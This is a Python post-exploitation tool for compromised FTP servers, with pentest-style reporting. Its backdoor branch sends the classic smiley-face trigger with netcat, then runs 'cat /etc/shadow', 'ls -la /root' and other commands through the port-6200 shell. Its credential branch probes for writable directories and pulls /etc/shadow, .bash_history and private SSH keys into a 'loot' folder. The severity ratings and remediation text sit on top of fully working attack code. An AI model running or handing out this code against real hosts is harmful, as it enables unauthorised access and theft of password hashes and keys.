#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple, Optional
import sys
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
LOOT_DIR = OUTPUT_DIR / "loot"
UPLOAD_TEST_FILE = OUTPUT_DIR / "post_exploit_upload_test.txt"


def run_command(cmd: str, timeout: int = 60, shell: bool = True) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    logger.info(f"Running command: {cmd}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout,
            encoding="utf-8",
            errors="ignore"
        )
        return result.stdout.strip(), result.returncode == 0
    except Exception as e:
        logger.error(f"Error running command: {cmd} - {e}")
        return str(e), False


def run_ftp_command(target: str, port: int, username: str, password: str, command: str) -> Tuple[str, bool]:
    """Run a single FTP command with given credentials."""
    logger.info(f"Running FTP command on {target}:{port}: {command.strip()}")
    ftp_script = f"user {username} {password}\n{command}\nquit\n"
    process = subprocess.Popen(
        ["ftp", "-n", "-v", target, str(port)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8",
        errors="ignore"
    )
    try:
        output, _ = process.communicate(ftp_script, timeout=60)
        success = ("Login successful" in output or "230" in output) and "530" not in output
        return output, success
    except subprocess.TimeoutExpired:
        process.kill()
        return "Command timed out", False


def post_exploit_via_shell(target: str, port: int) -> List[Dict]:
    """Run post-exploitation commands through a known backdoor shell."""
    logger.info("Executing post-exploitation via backdoor shell on port 6200.")
    results = []
    
    commands_to_run = {
        "read_shadow_file": ("cat /etc/shadow", "High", "The shadow file contains hashed passwords and should be unreadable by any service account. Its exposure is a critical risk."),
        "list_root_directory": ("ls -la /root", "Medium", "Listing the root user's home directory can reveal sensitive configuration files or scripts."),
        "check_network_config": ("ifconfig -a", "Low", "Network configuration can reveal internal network structures and other potential targets."),
        "check_running_processes": ("ps aux", "Low", "The process list can reveal running services, user activity, and potential privilege escalation vectors."),
    }

    for action, (cmd, severity, recommendation) in commands_to_run.items():
        trigger_cmd = f"echo 'USER test:)' | nc -w 5 {target} {port}"
        run_command(trigger_cmd, timeout=10)
        time.sleep(2)

        proof_cmd = f"echo '{cmd}' | nc -w 10 {target} 6200"
        output, success = run_command(proof_cmd)
        
        if success and output:
            results.append({
                "type": action,
                "details": f"Successfully executed '{cmd}' via backdoor shell.",
                "proof": output,
                "severity": severity,
                "poc": proof_cmd,
                "recommendation": recommendation
            })
    return results


def find_writable_directory_ftp(target: str, port: int, username: str, password: str, home_dir: str) -> Optional[Dict]:
    """Find a writable directory and return a structured result."""
    if not UPLOAD_TEST_FILE.exists():
        UPLOAD_TEST_FILE.write_text("This is a test file.")
    
    common_dirs = ["/tmp", home_dir, "."]
    for directory in common_dirs:
        test_filename = f"upload_test_{int(time.time())}.txt"
        remote_path = f"{directory}/{test_filename}" if directory != "." else test_filename
        upload_cmd = f"put {UPLOAD_TEST_FILE.resolve()} {remote_path}"
        upload_output, success = run_ftp_command(target, port, username, password, upload_cmd)
        
        if success and "226" in upload_output:
            logger.info(f"SUCCESS: Found writable directory: {directory}")
            run_ftp_command(target, port, username, password, f"delete {remote_path}") # Cleanup
            return {
                "type": "writable_directory_found",
                "details": f"The FTP user '{username}' has write permissions in the directory: '{directory}'.",
                "proof": f"Successfully uploaded and then deleted a test file named '{test_filename}' in '{directory}'. Raw FTP response: {upload_output}",
                "severity": "Medium",
                "poc": f"Use an FTP client with user '{username}' to 'put' a file into the '{directory}' directory.",
                "recommendation": "Restrict FTP user permissions to be read-only unless file uploads are explicitly required. Ensure proper ownership and permissions are set on all directories."
            }
    logger.info("No common writable directories found.")
    return None


def download_sensitive_files_ftp(target: str, port: int, username: str, password: str, home_dir: str) -> List[Dict]:
    """Attempt to download sensitive files and return structured results."""
    LOOT_DIR.mkdir(exist_ok=True)
    logger.info(f"Attempting to download sensitive files. Loot will be saved in '{LOOT_DIR}/'")
    results = []
    
    files_to_try = [
        ("/etc/passwd", "User accounts file", "Medium"),
        ("/etc/shadow", "User password hashes", "High"),
        (f"{home_dir}/.bash_history", "User command history", "Medium"),
        (f"{home_dir}/.ssh/id_rsa", "User's private SSH key", "Critical"),
    ]

    for file_path, desc, severity in files_to_try:
        local_filename = f"{target}_{port}_{Path(file_path).name}"
        local_filepath = LOOT_DIR / local_filename
        
        get_cmd = f"get {file_path} {local_filepath}"
        _, success = run_ftp_command(target, port, username, password, get_cmd)

        if success and local_filepath.exists() and local_filepath.stat().st_size > 0:
            logger.info(f"SUCCESS: Downloaded {file_path}.")
            content_snippet = local_filepath.read_text(encoding="utf-8", errors="ignore").strip()
            
            proof = ""
            recommendation = "Review file permissions. Sensitive files should not be readable by the FTP user."
            
            if "PRIVATE KEY" in content_snippet:
                proof = f"Successfully downloaded a private key to '{local_filepath}'. The key has been saved for manual review."
                recommendation = "Private SSH keys should never be stored in a location accessible by a web or FTP service. Immediately revoke this key from all systems and investigate its usage."
            else:
                proof = "File downloaded successfully. First 500 characters:\n\n" + content_snippet[:500]
            
            results.append({
                "type": "sensitive_file_downloaded",
                "details": f"Successfully downloaded '{file_path}' ({desc}).",
                "proof": proof,
                "severity": severity,
                "poc": f"Use an FTP client with user '{username}' to 'get' the file '{file_path}'. The file has been saved to '{local_filepath}' for review.",
                "recommendation": recommendation
            })
        else:
             if local_filepath.exists():
                local_filepath.unlink()

    return results


def post_exploit_via_ftp(target: str, port: int, username: str, password: str) -> List[Dict]:
    """Run post-exploitation tasks using FTP credentials."""
    logger.info(f"Executing post-exploitation via FTP with user '{username}'.")
    results = []
    home_dir_output, _ = run_ftp_command(target, port, username, password, "pwd")
    home_dir_match = re.search(r'257 "([^"]+)"', home_dir_output)
    home_dir = home_dir_match.group(1) if home_dir_match else f"/home/{username}"

    writable_dir_result = find_writable_directory_ftp(target, port, username, password, home_dir)
    if writable_dir_result:
        results.append(writable_dir_result)

    download_results = download_sensitive_files_ftp(target, port, username, password, home_dir)
    results.extend(download_results)
    return results


def post_exploit_target(metadata: Dict) -> List[Dict]:
    """Intelligently select post-exploitation path based on the best exploit found."""
    target = metadata["target"]
    port = metadata["port"]
    logger.info(f"Starting intelligent post-exploitation of {target}:{port}")

    severity_map = {"Critical": 3, "High": 2, "Medium": 1}
    sorted_exploits = sorted(
        metadata.get("successful_exploits", []),
        key=lambda e: severity_map.get(e.get("severity"), 0),
        reverse=True
    )

    if not sorted_exploits:
        logger.error("No successful exploits found in the report.")
        return []

    best_exploit = sorted_exploits[0]
    exploit_type = best_exploit.get("type")
    logger.info(f"Prioritizing post-exploitation based on best exploit: {exploit_type} (Severity: {best_exploit.get('severity')})")

    if exploit_type == 'backdoor':
        return post_exploit_via_shell(target, port)
    
    elif exploit_type in ['brute_force', 'anonymous_access']:
        username, password = 'anonymous', 'anonymous'
        if exploit_type == 'brute_force':
            match = re.search(r"successful: (\S+):(\S+)", best_exploit["details"])
            if match: username, password = match.groups()
        
        return post_exploit_via_ftp(target, port, username, password)

    logger.warning(f"No defined post-exploitation path for exploit type: '{exploit_type}'.")
    return []


def save_post_exploit_report(results: List[Dict], target: str, port: int) -> None:
    """Save post-exploitation results to JSON and Markdown files with improved formatting."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    for result in results:
        result.setdefault('recommendation', 'No specific recommendation.')

    report_data = {
        "target": target,
        "port": port,
        "service": "ftp",
        "timestamp": timestamp,
        "post_exploitation_results": results,
        "summary": {
            "total_findings": len(results),
            "critical_severity_findings": len([r for r in results if r.get("severity") == "Critical"]),
            "high_severity_findings": len([r for r in results if r.get("severity") == "High"]),
            "medium_severity_findings": len([r for r in results if r.get("severity") == "Medium"]),
        }
    }
    
    json_path = OUTPUT_DIR / f"{target}_{port}_ftp_post_exploit.json"
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(report_data, f, indent=4)
    logger.info(f"JSON post-exploitation report saved: {json_path}")

    md_path = OUTPUT_DIR / f"{target}_{port}_ftp_post_exploit.md"
    with md_path.open("w", encoding='utf-8') as f:
        f.write(f"# FTP Post-Exploitation Report: {target}:{port}\n\n")
        f.write(f"**Generated:** {timestamp}\n\n")
        
        f.write("## Executive Summary\n\n")
        summary_text = f"A post-exploitation assessment was performed on the FTP service at {target}:{port} following a successful compromise. The assessment identified {len(results)} notable findings, including {report_data['summary']['critical_severity_findings']} critical and {report_data['summary']['high_severity_findings']} high-severity issues. Key findings include the successful download of sensitive system files, demonstrating significant information disclosure and a potential path for further system access. Immediate remediation of the identified vulnerabilities is recommended."
        f.write(summary_text + "\n\n")

        f.write("## Summary of Findings\n\n")
        f.write("| Severity   | Finding Type                | Details                                           |\n")
        f.write("|:-----------|:----------------------------|:--------------------------------------------------|\n")
        for result in results:
            f.write(f"| {result.get('severity', 'N/A')} | {result.get('type', 'N/A').replace('_', ' ').title()} | {result.get('details', 'N/A')} |\n")
        f.write("\n")
        
        if results:
            f.write("## Detailed Findings\n\n")
            for i, result in enumerate(results, 1):
                f.write(f"### {i}. {result.get('type', 'N/A').replace('_', ' ').title()}\n\n")
                f.write(f"- **Severity:** `{result.get('severity', 'N/A')}`\n")
                f.write(f"- **Details:** {result.get('details', 'N/A')}\n")
                f.write(f"- **PoC (Proof of Concept):** `{result.get('poc', 'N/A')}`\n\n")
                f.write("**Evidence:**\n")
                f.write("```text\n")
                f.write(result.get('proof', 'N/A').strip())
                f.write("\n```\n\n")
                f.write(f"**Recommendation:**\n\n{result.get('recommendation', 'N/A')}\n\n")
                f.write("---\n\n")
    
    logger.info(f"Markdown post-exploitation report saved: {md_path}")


def find_exploit_file(target: str, port: int) -> Optional[Path]:
    """Find the exploit metadata file for the target and port."""
    exploit_file = OUTPUT_DIR / f"{target}_{port}_ftp_exploit.json"
    if exploit_file.exists():
        return exploit_file
    logger.error(f"No exploit file found at {exploit_file}. Please run the exploit script first.")
    return None


def main():
    parser = argparse.ArgumentParser(description="Intelligent FTP Post-Exploitation Script")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--port", type=int, default=21, help="Target port for the service")
    args = parser.parse_args()
    
    try:
        exploit_file = find_exploit_file(args.target, args.port)
        if not exploit_file:
            sys.exit(1)
        
        with exploit_file.open("r", encoding='utf-8') as f:
            exploit_data = json.load(f)
        
        results = post_exploit_target(exploit_data)
        save_post_exploit_report(results, args.target, args.port)
        logger.info(f"Post-exploitation complete. Found {len(results)} items of interest.")
        
    except Exception as e:
        logger.error(f"An unexpected error occurred: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main() 